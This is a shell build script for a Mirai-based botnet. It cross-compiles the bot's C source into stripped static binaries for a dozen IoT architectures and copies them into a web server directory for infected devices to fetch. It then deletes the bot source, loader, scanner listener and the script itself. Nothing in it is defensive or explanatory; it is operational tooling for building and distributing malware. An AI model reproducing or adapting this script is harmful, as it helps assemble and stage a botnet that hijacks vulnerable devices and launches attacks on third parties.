export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
#export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/i586/bin
#go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
#gcc -std=c99 bot/*.c -DDEBUG -static -g -o dbg

# COMPILE SETTINGS
compile_bot() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.xt.prop --remove-section=.xt.lit --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.mdebug.abi32
}

compile_arm7() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.xt.prop --remove-section=.xt.lit --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.ARM.attributes --remove-section=.mdebug.abi32
}

compile_arm6() {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.xt.prop --remove-section=.xt.lit --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.ARM.attributes --remove-section=.mdebug.abi32
}

arc_compile() {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.xt.prop --remove-section=.xt.lit --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr --remove-section=.mdebug.abi32
}

mkdir ~/release

# mips mipsel
compile_bot mips mips "-static"
compile_bot mipsel mipsel "-static"
# arm sub archs
compile_bot armv4l arm "-static"
compile_bot armv5l arm5 ""
compile_arm7 armv7l arm7 "-static"
arc_compile arc arc "-static"
compile_arm6 armv6l arm6 "-static"
# others
compile_bot sh4 sh4 "-static"
#compile_bot sparc sparc "-static"

# all 86
compile_bot x86_64 x86_64 "-static"
compile_bot i686 i686 "-static"
compile_bot i586 i586 "-static"

# MOVE BINARIES TO DIRECTORY
cp release/* /var/www/html/
#cp release/* /srv/tftp

# CLEANUP
rm -rf ~/scanListen.go ~/build.sh ~/bot ~/Projects ~/loader
rm -rf ~/release
